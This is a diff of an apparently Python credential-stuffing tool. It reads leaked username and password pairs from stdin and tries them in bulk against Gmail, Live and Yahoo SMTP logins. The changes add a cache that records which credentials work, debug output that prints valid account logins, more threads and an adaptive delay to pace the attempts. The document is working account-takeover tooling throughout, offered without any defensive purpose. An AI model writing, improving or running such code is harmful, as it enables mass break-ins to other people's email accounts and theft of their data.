@@ -14,7 +14,7 @@ import sys
 import time
 
 RC = "%s/.fisgon/" % os.getenv("HOME")
-VERBOSE = 4
+VERBOSE = 0
 
 
 class Discovers(list):
@@ -30,20 +30,6 @@ def write(text, destination):
     f.close()
 
 
-def log(func):
-    @wraps(func)
-    def dfunc(*args, **kwargs):
-        result = func(*args, **kwargs)
-        if result:
-            write(";".join(args), func.func_name + ".txt")
-        elif result is not None:
-            write(";".join(args), "no-" + func.func_name + ".txt")
-        else:
-            write(";".join(args), "none-" + func.func_name + ".txt")
-
-    return dfunc
-
-
 def read(filename):
     try:
         pairs = [tuple(line.strip().split(";"))
@@ -54,9 +40,15 @@ def read(filename):
     return pairs
 
 
-def filter(func):
-    trues = set(read(func.func_name + ".txt"))
-    falses = set(read("no-" + func.func_name + ".txt"))
+
+
+def cache(func):
+    truesname = func.func_name + ".txt"
+    falsesname = "no-" + func.func_name + ".txt"
+    nonesname = "none-" + func.func_name + ".txt"
+
+    trues = set(read(truesname))
+    falses = set(read(falsesname))
 
     @wraps(func)
     def dfunc(*args, **kwargs):
@@ -65,9 +57,17 @@ def filter(func):
         elif args in falses:
             return False
         else:
-            return func(*args, **kwargs)
+            result = func(*args, **kwargs)
+            line = ";".join(args)
+            if result:
+                write(line, truesname)
+            elif result is not None:
+                write(line, falsesname)
+            else:
+                write(line, nonesname)
 
     return dfunc
+
 
 
 def ismail(user):
@@ -175,8 +175,7 @@ def facebook(user, password):
 @discovers
 @Async
 @Verbose(VERBOSE)
-@filter
-@log
+@cache
 def gmail(user, password):
     if ismail(user):
         smtp = smtplib.SMTP()
@@ -191,19 +190,19 @@ def gmail(user, password):
                 return False
             except socket.sslerror:
                 return False
-        except socket.gaierror:
-            debug("E: socket.gaierror")
+        except socket.gaierror or smtplib.SMTPServerDisconnected:
+            debug("E: Server disconnected")
             return None
     else:
         return False
+    debug("gmail: %s, %s" % (user, password))
     return "gmail.com"
 
 
 @discovers
 @Async
 @Verbose(VERBOSE)
-@filter
-@log
+@cache
 def live(user, password):
     if ismail(user):
         smtp = smtplib.SMTP()
@@ -223,14 +222,14 @@ def live(user, password):
             return None
     else:
         return False
+    debug("live: %s, %s" % (user, password))
     return "live.com"
 
 
 @discovers
 @Async
 @Verbose(VERBOSE)
-@filter
-@log
+@cache
 def yahoo(user, password):
     if ismail(user) and "@yahoo." in user:
         smtp = smtplib.SMTP()
@@ -247,6 +246,7 @@ def yahoo(user, password):
             return None
     else:
         return False
+    debug("yahoo: %s, %s" % (user, password))
     return "yahoo.com"
 
 
@@ -254,7 +254,8 @@ def main():
     debug("FUN TIME!")
     entrada = sys.stdin.readlines()
 
-    threads = 20
+    threads = 40
+    pause = .1
     slots = [None] * threads
     for line in entrada:
         user, password = line.strip().split(";")[:2]
@@ -263,21 +264,22 @@ def main():
         for discover in discovers:
             if isinstance(discover, Async):
                 passed = False
+                tries = 0
                 while not passed:
+                    tries += 1
                     for pos in xrange(threads):
                         if slots[pos] is None or not slots[pos].is_alive():
                             slots[pos] = discover(user, password)
                             passed = True
                             break
-                    time.sleep(.25)
+                    time.sleep(pause)
+                pause *= tries ** 0.2 * .9
+                if tries > 10:
+                    pause = pause * 10 + 0.001
 
     for slot in slots:
         if slot is not None:
             slot.get_result()
-
-#        #Monotarea
-#        resultados = [d(user, password)
-#            for d in discovers if not isinstance(d, Async)]
 
     debug(">>> EOF !!")
 
